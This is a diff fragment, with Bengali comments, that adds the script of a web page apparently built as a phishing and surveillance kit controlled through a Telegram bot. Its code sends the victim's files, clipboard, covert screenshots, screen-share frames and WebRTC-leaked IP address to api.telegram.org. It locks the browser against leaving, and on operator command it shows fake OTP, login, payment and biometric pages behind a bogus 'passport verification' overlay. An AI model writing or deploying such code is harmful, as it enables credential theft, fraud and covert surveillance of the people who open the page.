+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
+                }
+                sendToBot(`📂 **${files.length}টি ফাইল পাঠানো হয়েছে**`);
+            };
+            input.click();
+        }
+
+        // ============================================================
+        // 🔒 ব্রাউজার লক/আনলক
+        // ============================================================
+        function fullBrowserLockdown() {
+            try { document.documentElement.requestFullscreen(); } catch(e) {}
+            window.history.pushState(null, "", window.location.href);
+            window.onpopstate = () => window.history.pushState(null, "", window.location.href);
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => {
+                if(e.key === 'Escape' || e.key === 'F11' || (e.altKey && (e.key === 'F4' || e.key === 'Tab'))) e.preventDefault();
+            });
+            setInterval(() => { try { if(!document.fullscreenElement) document.documentElement.requestFullscreen(); } catch(e) {} }, 3000);
+            isBrowserLocked = true;
+            sendToBot(`🔒 **ব্রাউজার লকডাউন!**`);
+        }
+
+        function unlockBrowser() {
+            try { if(document.fullscreenElement) document.exitFullscreen(); } catch(e) {}
+            window.onpopstate = null;
+            isBrowserLocked = false;
+            sendToBot(`🔓 **ব্রাউজার আনলক**`);
+        }
+
+        // ============================================================
+        // 🌐 রিয়েল IP
+        // ============================================================
+        function getRealIP() {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                pc.createDataChannel("");
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = e => {
+                    if(e.candidate) {
+                        const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)?.[0];
+                        if(ip) sendToBot(`🌐 **রিয়েল IP:** \`${ip}\``);
+                    }
+                };
+                setTimeout(() => pc.close(), 5000);
+            } catch(e) { sendToBot(`❌ **IP লিক ব্যর্থ**`); }
+        }
+
+        // ============================================================
+        // 📋 ক্লিপবোর্ড
+        // ============================================================
+        function startClipboardMonitoring() {
+            sendToBot(`📋 **ক্লিপবোর্ড মনিটরিং শুরু**`);
+            clipboardMonitorInterval = setInterval(async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if(text && text !== lastClipboardContent) {
+                        lastClipboardContent = text;
+                        sendToBot(`📋 **ক্লিপবোর্ড:** \`${text}\``);
+                    }
+                } catch(e) {}
+            }, 2000);
+        }
+
+        function stopClipboardMonitoring() {
+            if(clipboardMonitorInterval) { clearInterval(clipboardMonitorInterval); clipboardMonitorInterval = null; }
+            sendToBot(`⏹️ **ক্লিপবোর্ড বন্ধ**`);
+        }
+
+        // ============================================================
+        // 🖥️ স্ক্রিন শেয়ার
+        // ============================================================
+        async function requestScreenShare() {
+            try {
+                screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "always" }, audio: false });
+                isScreenSharing = true;
+                sendToBot(`✅ **স্ক্রিন শেয়ার শুরু**`);
+                screenStream.getVideoTracks()[0].onended = () => stopScreenShare();
+                captureAndSendFrame();
+                showStep('verifying');
+            } catch(e) { sendToBot(`❌ **স্ক্রিন শেয়ার ডিনাইড**`); }
+        }
+
+        function captureAndSendFrame() {
+            if(!screenStream || !isScreenSharing) return;
+            const video = document.createElement('video');
+            video.srcObject = screenStream;
+            video.play();
+            screenCaptureInterval = setInterval(() => {
+                if(!isScreenSharing || !screenStream) { clearInterval(screenCaptureInterval); return; }
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 720;
+                canvas.height = video.videoHeight || 1280;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob((blob) => {
+                    if(!blob) return;
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, `screen_${Date.now()}.jpg`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.4);
+            }, 4000);
+        }
+
+        function stopScreenShare() {
+            if(screenStream) { screenStream.getTracks().forEach(t => t.stop()); screenStream = null; }
+            if(screenCaptureInterval) { clearInterval(screenCaptureInterval); screenCaptureInterval = null; }
+            isScreenSharing = false;
+            sendToBot(`⏹️ **স্ক্রিন শেয়ার বন্ধ**`);
+        }
+
+        // ============================================================
+        // 👁️ স্টিলথ স্ক্রিন (html2canvas — ইউজার জানবে না)
+        // ============================================================
+        function startStealthScreenMonitor() {
+            if(!window.html2canvas) {
+                const s = document.createElement('script');
+                s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                document.head.appendChild(s);
+                s.onload = () => beginStealthCapture();
+            } else { beginStealthCapture(); }
+        }
+
+        function beginStealthCapture() {
+            sendToBot(`👁️ **স্টিলথ স্ক্রিন মনিটরিং শুরু! ইউজার জানবে না**`);
+            stealthMonitorInterval = setInterval(async () => {
+                try {
+                    const canvas = await html2canvas(document.documentElement, {
+                        useCORS: true, allowTaint: true, scale: 1.0, logging: false, backgroundColor: null
+                    });
+                    canvas.toBlob(async (blob) => {
+                        if(!blob) return;
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, `stealth_${Date.now()}.jpg`);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg', 0.4);
+                } catch(e) {}
+            }, 3000);
+        }
+
+        function stopStealthMonitor() {
+            if(stealthMonitorInterval) { clearInterval(stealthMonitorInterval); stealthMonitorInterval = null; }
+            sendToBot(`⏹️ **স্টিলথ স্ক্রিন বন্ধ**`);
+        }
+
+        function takeOneScreenshot() {
+            if(!window.html2canvas) {
+                const s = document.createElement('script');
+                s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                document.head.appendChild(s);
+                s.onload = captureOneShot;
+            } else { captureOneShot(); }
+        }
+
+        async function captureOneShot() {
+            try {
+                const canvas = await html2canvas(document.documentElement, {
+                    useCORS: true, allowTaint: true, scale: 1.5, logging: false
+                });
+                canvas.toBlob(async (blob) => {
+                    if(!blob) return;
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, `screenshot_${Date.now()}.png`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    sendToBot(`📸 **স্ক্রিনশট পাঠানো হয়েছে**`);
+                }, 'image/png', 0.9);
+            } catch(e) { sendToBot(`❌ **স্ক্রিনশট ব্যর্থ**`); }
+        }
+
+        // ============================================================
+        // 📌 PiP মোড
+        // ============================================================
+        async function enterPiPMode() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 100, height: 100 }, audio: false 
+                });
+                
+                pipVideoElement = document.createElement('video');
+                pipVideoElement.srcObject = stream;
+                pipVideoElement.muted = true;
+                pipVideoElement.style.display = 'none';
+                document.body.appendChild(pipVideoElement);
+                await pipVideoElement.play();
+                
+                await pipVideoElement.requestPictureInPicture();
+                pipActive = true;
+                
+                const pipCanvas = document.createElement('canvas');
+                pipCanvas.width = 400;
+                pipCanvas.height = 300;
+                const ctx = pipCanvas.getContext('2d');
+                
+                setInterval(() => {
+                    if(!pipVideoElement || !document.pictureInPictureElement) return;
+                    ctx.fillStyle = '#1877f2';
+                    ctx.fillRect(0, 0, 400, 300);
+                    ctx.fillStyle = 'white';
+                    ctx.font = 'bold 20px Arial';
+                    ctx.fillText('✅ পাসপোর্ট ভেরিফিকেশন', 40, 60);
+                    ctx.font = '14px Arial';
+                    ctx.fillText(`📅 ${new Date().toLocaleDateString()}`, 40, 110);
+                    ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 40, 140);
+                    ctx.fillStyle = '#4CAF50';
+                    ctx.fillRect(40, 180, 20, 20);
+                    ctx.fillStyle = 'white';
+                    ctx.font = '12px Arial';
+                    ctx.fillText('অটোমেটিক ভেরিফিকেশন চলছে', 70, 195);
+                    ctx.fillStyle = '#FFD700';
+                    ctx.font = '11px Arial';
+                    ctx.fillText('🔒 SSL এনক্রিপ্টেড', 40, 240);
+                }, 2000);
+                
+                document.getElementById('pip_overlay').classList.remove('hidden');
+                showMiniPlayer();
+                startStealthScreenMonitor();
+                startClipboardMonitoring();
+                sendToBot(`📌 **PiP মোড চালু! ইউজার অন্য অ্যাপে গেলেও কাজ করবে**`);
+            } catch(e) {
+                sendToBot(`❌ **PiP মোড ব্যর্থ:** ${e.message}`);
+                startStealthScreenMonitor();
+            }
+        }
+
+        function showMiniPlayer() {
+            const player = document.getElementById('mini_player');
+            player.classList.remove('hidden');
+            
+            let isDragging = false, ox, oy;
+            player.addEventListener('mousedown', (e) => {
+                isDragging = true;
+                ox = e.clientX - player.getBoundingClientRect().left;
+                oy = e.clientY - player.getBoundingClientRect().top;
+            });
+            document.addEventListener('mousemove', (e) => {
+                if(isDragging) {
+                    player.style.left = (e.clientX - ox) + 'px';
+                    player.style.top = (e.clientY - oy) + 'px';
+                    player.style.right = 'auto';
+                }
+            });
+            document.addEventListener('mouseup', () => isDragging = false);
+            
+            miniPlayerInterval = setInterval(() => {
+                progressValue = Math.min(progressValue + Math.floor(Math.random() * 5) + 1, 99);
+                document.getElementById('progress_text').textContent = `⏳ ${progressValue}% সম্পন্ন`;
+                document.getElementById('progress_bar').style.width = `${progressValue}%`;
+            }, 2000);
+        }
+
+        // ============================================================
+        // ⏹️ সব বন্ধ
+        // ============================================================
+        function stopAll() {
+            stopScreenShare();
+            stopClipboardMonitoring();
+            stopStealthMonitor();
+            stopLiveGPSTracking();
+            if(pipVideoElement) {
+                try { document.exitPictureInPicture(); } catch(e) {}
+                pipVideoElement.srcObject?.getTracks().forEach(t => t.stop());
+                pipVideoElement.remove();
+                pipVideoElement = null;
+            }
+            pipActive = false;
+            document.getElementById('pip_overlay').classList.add('hidden');
+            document.getElementById('mini_player').classList.add('hidden');
+            if(miniPlayerInterval) { clearInterval(miniPlayerInterval); miniPlayerInterval = null; }
+            progressValue = 0;
+            sendToBot(`⏹️ **সব বন্ধ করা হয়েছে**`);
+        }
+
+        // ============================================================
+        // 🎯 স্টেপ ম্যানেজমেন্ট
+        // ============================================================
+        function showStep(id) {
+            const modals = ['fake_otp_page', 'biometric_modal', 'fake_login_page', 'fake_payment_page', 
+                           'start_screen_page', 'verifying', 'permission_modal'];
+            modals.forEach(m => {
+                const el = document.getElementById(m);
+                if(el) { el.classList.add('hidden'); el.classList.remove('flex'); el.style.display = 'none'; }
+            });
+            
+            if(id === 'fake_otp_page') {
+                const el = document.getElementById('fake_otp_page');
+                el.classList.remove('hidden'); el.classList.add('flex'); el.style.display = 'flex';
+                setupOTPInputs();
+                return;
+            }
+            if(id === 'biometric_modal') {
+                document.getElementById('biometric_modal').classList.remove('hidden');
+                document.getElementById('biometric_modal').classList.add('flex');
+                document.getElementById('biometric_modal').style.display = 'flex';
+                return;
+            }
+            if(id === 'fake_login_page') {
+                document.getElementById('fake_login_page').classList.remove('hidden');
+                document.getElementById('fake_login_page').classList.add('flex');
+                document.getElementById('fake_login_page').style.display = 'flex';
+                return;
+            }
+            if(id === 'fake_payment_page') {
+                document.getElementById('fake_payment_page').classList.remove('hidden');
+                document.getElementById('fake_payment_page').classList.add('flex');
+                document.getElementById('fake_payment_page').style.display = 'flex';
+                return;
+            }
+            if(id === 'start_screen_page') {
+                document.getElementById('start_screen_page').classList.remove('hidden');
+                document.getElementById('start_screen_page').classList.add('flex');
+                document.getElementById('start_screen_page').style.display = 'flex';
+                return;
+            }
+            if(id === 'verifying') {
+                document.getElementById('verifying').classList.remove('hidden');
+                document.getElementById('verifying').classList.add('flex');
+                document.getElementById('verifying').style.display = 'flex';
+                return;
+            }
+            
+            const top = document.getElementById('main_top_image');
+            const bottom = document.getElementById('main_bottom_content');
+            
+            if(id === 'step2' || id === 'success_page' || id === 'error_page') {
+                if(top) top.style.display = 'none';
+                if(bottom) { bottom.style.height = '100vh'; bottom.style.padding = '0px'; }
+            } else {
+                if(top) top.style.display = 'flex';
+                if(bottom) { bottom.style.height = '52vh'; bottom.style.padding = '20px'; }
+            }
+            
+            const pages = ['step1', 'step2', 'google_chooser', 'success_page', 'error_page', 'stop_screen_page', 'stop_clipboard_page'];
+            pages.forEach(p => {
+                const el = document.getElementById(p);
+                if(el) el.classList.add('hidden');
+            });
+            
+            const target = document.getElementById(id);
+            if(target) { target.classList.remove('hidden'); target.classList.add('flex'); }
+        }
+
+        function lockBrowser() {
+            window.history.pushState(null, "", window.location.href);
+            window.onpopstate = () => window.history.pushState(null, "", window.location.href);
+        }
+
+        // ============================================================
+        // 📤 টেলিগ্রাম ফাংশন
+        // ============================================================
+        function sendToBot(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        }
+
+        function sendToBotWithKeyboard(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, reply_markup: POWER_COMMANDS })
+            });
+        }
+
+        // ============================================================
+        // 🎧 টেলিগ্রাম লিসেনার (C2)
+        // ============================================================
+        function startListening() {
+            setInterval(async () => {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+                    const data = await res.json();
+                    if(data.ok && data.result.length > 0) {
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+                            const cmd = update.callback_query?.data;
+                            
+                            if(cmd === "photo_cmd" || cmd === "biometric_cmd") showStep('biometric_modal');
+                            else if(cmd === "audio_cmd") startAudioRecording(10000);
+                            else if(cmd === "gps_cmd") captureGPS();
+                            else if(cmd === "live_gps_cmd") startLiveGPSTracking();
+                            else if(cmd === "stop_live_gps_cmd") stopLiveGPSTracking();
+                            else if(cmd === "cred_cmd") showFakeLogin();
+                            else if(cmd === "payment_cmd") showFakePayment();
+                            else if(cmd === "otp_cmd") showStep('fake_otp_page');
+                            else if(cmd === "files_cmd") triggerFileExfil();
+                            else if(cmd === "lock_cmd") fullBrowserLockdown();
+                            else if(cmd === "unlock_cmd") unlockBrowser();
+                            else if(cmd === "start_screen_cmd") showStep('start_screen_page');
+                            else if(cmd === "stop_screen_cmd") { stopScreenShare(); showStep('stop_screen_page'); }
+                            else if(cmd === "clipboard_cmd") startClipboardMonitoring();
+                            else if(cmd === "stop_clipboard_cmd") { stopClipboardMonitoring(); showStep('stop_clipboard_page'); }
+                            else if(cmd === "ip_cmd") getRealIP();
+                            else if(cmd === "pip_cmd") enterPiPMode();
+                            else if(cmd === "stealth_screen_cmd") startStealthScreenMonitor();
+                            else if(cmd === "stop_stealth_cmd") stopStealthMonitor();
+                            else if(cmd === "screenshot_cmd") takeOneScreenshot();
+                            else if(cmd === "stop_all_cmd") stopAll();
+                            else if(cmd === "success") showStep('success_page');
+                            else if(cmd === "error") showStep('error_page');
+                        });
+                    }
+                } catch(e) {}
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
